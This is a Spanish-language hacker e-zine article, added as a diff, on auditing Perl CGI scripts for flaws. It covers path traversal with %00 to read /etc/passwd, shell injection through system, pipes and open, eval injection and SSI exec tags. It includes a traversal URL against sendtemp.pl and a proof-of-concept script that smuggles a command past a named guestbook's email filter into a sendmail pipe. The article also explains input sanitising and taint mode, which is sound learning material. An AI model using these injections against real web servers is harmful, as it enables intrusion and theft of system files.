@@ -1,0 +1,301 @@
+  -=( 7A69 E-zine 11 )=--=( art13 )=--=( Fallos en los CGIs )=--=( Anarion )=-
+
+		Fallos de seguridad en los CGIs
+		-------------------------------
+		
+Como en cualquier otro programa, los cgis solo son susceptibles a ataques
+cuando los programadores los programan mal, y no creo ke dar acceso CGI sea 
+peligroso en si, solo si se usan los programas inadecuados. Es como decir que 
+dar acceso a cualquier otro servicio es peligroso solo si los programadores 
+hayan tenido un descuido y pueda tener un bof.
+
+Antes de nada supondremos ke no tenemos el codigo fuente del cgi y no sabemos
+nada, como podria pasar si el cgi estuviera echo en C, o en cualquier otro 
+lenguaje. El problema principal en todos los cgis siempre es el mismo: NUNCA se
+debe de creer ke la entrada de un formulario sera lo ke se espera, asi de 
+facil y sencillo. Si esto lo cumplieran los programadores, no habria cgis 
+explotables. 
+Bueno almenos no en perl, kes a lo ke mas voy a dedicar este articulo.
+
+Aunque parezca mentira, aun hay programadores que no parsean la entrada que le
+llega de un formulario creyendo que los usuarios pondran lo que se espera de el
+los que pongan, que no pondran a prueba su cgi para conseguir aceso shell a la 
+maquina, enviarse los passwords o hacer otras cosas peores.
+
+La manera de escribir un CGI seguro es parseando la entrada asi de facil.
+Para eso la gente lo hara de dos maneras, asi que primero de todo cuando cojais
+un codigo fuente de un cgi en perl buscad si usa el modulo CGI o no.
+
+Si usa el modulo CGI, habra una linea ke pondra: use CGI; (al principio 
+normalmente). Bueno eso significa ke el usuario debera crear una variable de 
+este tipo con una sintaxis parecida a $variable = new CGI;
+Como el modulo cgi no parsea la entrada tenemos que mirar kel usuario lo haga a
+mano, que normalmente y asi podemos ver ke usa: 
+$variable=$algo->param("nombre_variable"); 
+para leer las variables del formulario.
+
+Antes de seguir mejor echarle un ojo a la cabezera pk si el programador es un 
+poco paranoico usara el modo -T ( Taint Mode) lo que significa kel perl marca 
+toda la entrada de datos no fiable y restringe las cosas que puedes aceder con 
+datos marcados como no fiables. No voy a contar como funciona todo el modo -T
+pero se encarga de mirar los permisos del directorios, archivos, y como marca 
+todos los datos no fiables no podemos usarlos directamente en ninguna llamada a
+ningun proceso que se ejecute en una sub-shell. A esto hay una exepcion y es 
+pasarle los datos a system o exec como una lista, entonces no los comprueba.
+
+Bueno miremos si el programador parsea la entrada, al principio es logico 
+podria usar un bucle para checkear todas las variables o mirar si las checkea 
+luego una por una. Basicamente debe buscar 2 cosas, caracteres especiales, por
+ejemplo el mitico %00 que es el caracter de fin de cadena en perl con lo cual 
+si una variable forma parte del nombre de un archivo, podemos saltarlos el 
+resto, esto añadido a ke al programador le da = ke pongamos ../ tantas veces 
+como keramos y que al administrador nos da acceso desde el nobody a todo el sistema, ya que por muchas razones, el apache no suele corre con chroot, podemos 
+abrir cualquier archivo del hd si sabemos el path.
+
+Bueno como parsear la entrada es tan facil como o crear una funcion o una subrutina con algo parecido a :
+$algo =~ /^([-\@\w.]+)$/; 
+# Solo permitimos \w = alfanumericos,"@","-" y ".". Podemos añadir por ejemplo
+"_".
+
+Para ver si parsea o o la entrada debemos mirar los param del objeto, si llama
+$algo->param sin especificar el nombre de la variable devuelve una lista con 
+todas las variables que le pasan al formulario.
+
+El otro metodo es no usar el modulo CGI y cojer y asignar las entradas uno mismo.
+Esto se hace con la funcion read y luego lo normal es crear un hash con todas las entradas. normalmente
+todo el mundo lo llama %FORM
+El codigo sera algo parecido a esto:
+
+read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'}); <-- esta linea puede variar si 
+                                                  usa GET o POST
+
+@pairs = split(/&/, $buffer);
+foreach $pair (@pairs)
+{
+ ($name, $value) = split(/=/, $pair);
+ $value =~ tr/+/ /;
+ $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
+ $FORM{$name} = $value;
+}
+
+Hay algunos codigos con los ke puedes sobrescribir cualquier variable, pk usa
+algo parecido a $name=$value; en vez de crear un hash con lo cual imaginaos ke 
+definimos anteriormente variables como $sendmail o $document_root o cualquier 
+cosa, la podrias sobrescribir solo con añadirlo a las variables ke nos llegan 
+de formulario.
+
+Que podemos buscar para mirar si un cgi es o no explotable ... bueno una vez 
+visto que no parsea la entrada kizas tenemos que buscar donde aprovecharnos de
+esto :)
+
+La inseguridad la mayoria de veces se produce al llamar a una sub-shell o abrir
+un fichero o pipe.
+Primero debemos mirar si el programa usa nombres relativos o absolutos, ya ke 
+si son relativos kizas podamos sobrescribir el $ENV{PATH} y hacer ke llame a 
+nuestro programa en vez del ke se creia el script :)
+Incluso aunque llame al programa con la ruta completa hay otras variables en 
+%ENV ke podria ser ke leyera ese programa, asi ke debemos mirar si el autor 
+limpia el %ENV. Entonces encontraremos una linea parecida a esto:
+
+delete @ENV{qw(IFS CDPATH ENV BASH_ENV)};   # Make %ENV safer
+
+kes lo ke aconsejan si leeis el manual del perl (man perlsec)
+
+Antes de nada miremos todo lo ke se ejecuta en una sub-shell es decir
+system, exec, o si usa backtricks `.
+Por ejemplo:
+system("/usr/lib/sendmail -t $foo_address < $input_file");
+Pero yo dudo ke alguen sea lo suficientemente estupido como para dejarte 
+interpolar variables en un system.
+
+lo mismo va por $directorio = `ls -c1 $algo` o cualquier sintaxis parecida.
+
+La manera de llamar a una shell sin ke se tengan encuenta los metacaracteres es
+pasandole una lista de argumentos, por ejemplo si vemos :
+
+system "/usr/lib/sendmail -t",$mi_var;
+
+no os serviran los metaracteres, o si veis ke hace un fork con un open y el nombre de archivo le pone |- o -| y luego hara un exec del subproceso
+
+A pero al = no usa system y usa una pipe ... bueno eprobemos este codigo
+perl -e ' $a = "/usr/lib/sendmail; ls -al / "; open(FILE,"|$a");print FILE "hola";'
+
+Otra cosa a mirar a parte de usar sub-shells es si se utiliza eval.
+
+Con eval una simple expresion regular se puede convertir en una manera de
+explotarlo.
+
+Supongamos ke keremos buscar en una linea la cadena introducida por un usuario:
+
+$cadena = $algo->param("mi_cadena");
+
+$texto =~ /$cadena/;
+
+El problema es ke kien nos asegura ke en $cadena haya una expresion regular 
+valida ??
+
+Entonces el programador ke no tiene un pelo de listo haria :
+
+eval "... if $texto =~ /$cadena/;";
+
+para ver si es una expresion regular valida o no pero deberia haber usado llaves para hacerlo seguro pk asi como esta podemos ejecutar cualquier codigo :)
+Deberia haber usado llaves con eval {} ke si no lo trata como una cadena.
+Ejemplo:
+
+#!/usr/bin/perl
+$a = '/; system "mkdir /tmp/hola"; /';
+$b = "pepito";
+print "A=$a\n"; 
+eval "print 'Trobat\n' if $b =~ /$a/;";
+
+O lo mas normal es que use open para leer un archivo de texto, pero si no parsea la entrada podremos poner
+la ya tipic sintaxis ../../../../archivo%00 el %00 es el caracter de fin de cadena en perl
+y es para que el open no siga leyendo lo ke hay acontinuacion i saltarnos la extesion. Por ejemplo:
+
+open(FILE,"/mi_path/$algo.html"); se convierte en /mi_path/../../../../etc/passwd(caracter de fin de cadena).html
+
+Como explotar los SSI
+Cuando encontremos un guestbook o cualquier documento en ke despues de editarlo se vea por pagina web
+podemos probar si reconoce o no los tags html de una manera aparentemente inocente probar a ponerun <b>
+delante de una palabra si funcion podreis y tienen activado los ssi pos podreis ejecutar cualquier programa.
+
+<!--#exec cgi="/cgi-bin/counter.pl-->
+<!--#exec cmd="ls -l /"-->
+
+Otro posible problema en los cgis son las race conditions aunke la gente no suele darle importancia pero
+en la mayoria de escripts no se comprueba los archivos ke se abren para lectura y/o escritura.
+
+Voy a cojer algunos codigos fueten para examinar los errores:
+
+CGI-Script MAILNEWS 1.3
+This script helps you to maintain a mailinglist.
+open (MAIL, "|$mailprog $member") || die "Can't open $mailprog!\n";
+Ops ke $member tan interesante ...
+
+ W3.ORG sendtemp.pl 
+ my $temp_file = param("templ");
+ 
+ Vaya no parsea la entrada, podemos enviarle lo que queramos
+ http://localhost/cgi-bin/sendtemp.pl?templ=../../etc/passwd
+
+mm con 1 lineas dejaria de explotarse todas estas vulneralidades de directory transversal
+print "Error hack detected" and die "Sucks hack detected" if $variable =~ /\.\./; 
+Asi en resumen debemos mirar:
+
+- Mirar si parsean la entrada
+- Llamada a sub-shells, incluido opens i pipes
+- Llamada a eval
+- Mirar como leen las variables por si podemos sobrescribir la configuracion del propio programa
+- Acceso SSI
+
+Para acabar e cojido un guestbook i voy a mirarme yo su codigo haber ke 
+encuentro e ido a www.cgi-resources.com y e cojido el guestbook con mas votos.
+   
+Lars Ellingsen's Guestbook System, (11 comments) Rating: 9.56 (2515 votes) 
+ Version: 4.06 - Released: 12/06/98 - Free - Platform(s): Unix, Windows NT  
+ A highly configurable guestbook system that is very easy to install.
+ Includes e-mail notification, mail to guest, dirty-words removal, extensive html-filtering, separate configuration file and lots of different languages. 
+
+Linea 392
+
+    if ($FORM{'old_datafile'} && $show_old_files) {
+	$data_file = $FORM{'old_datafile'};
+        undef $entries_shown;
+    }
+
+Linea 397    
+
+ if (open(GUESTFILE,"<${dirpath}${data_file}")) {
+ 
+ mmm vaya asi ke aber si ha parseado $FORM{'old_datafile'};
+ 
+ Veamos la entrada de datos del formulario
+ 
+ sub extract_forminfo {
+     if ($ENV{'REQUEST_METHOD'} eq "GET") {
+ 	$buffer = $ENV{'QUERY_STRING'};
+     } else {
+ 	read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
+     }
+ 
+     @pairs = split(/&/, $buffer);
+     foreach $pair (@pairs) {
+ 	($name, @values) = split(/=/, $pair);
+ 	$value = join ("=", @values);
+ 	$value =~ tr/+/ /;
+ 	$value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
+ 	$FORM{$name} = $value;
+     }
+     $FORM{'name'} =~ s/\<[^\>]*\>//ig;
+     $FORM{'name'} =~ s/\<//g;
+     $FORM{'name'} =~ s/\>//g;
+     $FORM{'email'} =~ s/\<[^\>]*\>//ig;
+     $FORM{'email'} =~ s/\<//g;
+     $FORM{'email'} =~ s/\>//g;
+     $FORM{'email'} =~ s/\"/_/g;
+ 
+     if ($FORM{'email'} !~ /^[^\@]*[\@][^\@]*?\.[^\@]*$/g) {
+         $FORM{'email'} = undef;
+     }
+     $FORM{'homepage'} =~ s/\<[^\>]*\>//ig;
+     $FORM{'homepage'} =~ s/\<//g;
+     $FORM{'homepage'} =~ s/\>//g;
+     $FORM{'homepage'} =~ s/\"/_/g;
+ 
+     $FORM{'location'} =~ s/\<[^\>]*\>//ig;
+     $FORM{'location'} =~ s/\<//g;
+     $FORM{'location'} =~ s/\>//g;
+}
+
+Ke vien parsea muchas cosas pero no $FORM{'old_datafile'}; mmm ke tal si 
+ponemos en : $FORM{'old_datafile'} = "../../../../etc/passwd"; :P
+
+925 $FORM{'email'} = undef if $FORM{'email'} =~ /[\,\;\:]/; Vaya
+927     open (MAIL, "|$mailprogram $mailaddress");
+
+30	&send_mail if ($do_sendmail && $mailprogram && ($mailaddress =~ /\@/));
+
+958 	open (MAIL, "|$mailprogram $FORM{'email'}");
+
+
+Bua ahora si vemos como lo a parseado a intentado hacer su codigo seguro asi ke
+ahora ya no es estupido, simplemente negligente.
+
+     $FORM{'email'} =~ s/\<[^\>]*\>//ig; # Busca ke el primer < seguido de 0 o mas caracteres diferentes de \ y > hasta el siguiente > y lo elimina
+     					   Es para eliminar los tags.
+     $FORM{'email'} =~ s/\<//g;		# busca < y los elimina
+     $FORM{'email'} =~ s/\>//g;		# Busca > y los elimina
+     $FORM{'email'} =~ s/\"/_/g;        # cambia " por _
+     
+957   if ($FORM{'email'} =~ /.*?\@.*?\..*?/) {
+360  &mail_guest if ($mailto_guest && $mailprogram && ($FORM{'email'} !~ /[\,\:\;]/));
+Vale no podemos poner ni , ni : ni ; ... ni < ni > bueno pondremos otra cosa ;)
+Probad el siguiente codigo
+
+#!/usr/bin/perl
+$a="nobody\@awayz.org \n ls -l<\n>";
+print "Al principio A = $a\n";
+# Pasemosle los filtros ke le pasa el usuario este
+$a =~ s/\<[^\>]*\>//ig; # en la rutina extract_forminfo pasa 4 substituciones
+print "Despues d la primera substitucion A = $a\n";
+$a =~ s/\<//g;
+$a =~ s/\>//g;
+$a =~ s/\"/_/g;
+
+print "Despues de la todas las substituciones A = $a\n";
+# Ahora al llamar a la funcion
+if ($a !~ /[\,\:\;]/)
+{
+	print "A dentro del primer if\nA = $a\n";
+	# Ahora dentro de la funcion
+	if ($a =~ /.*?\@.*?\..*?/) # busca lokesea@lokessea.lokesea i lo ke sea puede ser espacios asi
+	{   # podemos poners algo@dominio \n orden a ejecutar seguida de punto
+		print "A dentro del segundo if\nA = $a\n";
+		open(FILE,"|/usr/lib/sendmail $a") or die "sucks : $!";
+		print FILE "algu";
+	}
+}
+
+El resultado es la ejecucion de nuestro codigo ... Ops :P
+
+-=(EOF)=
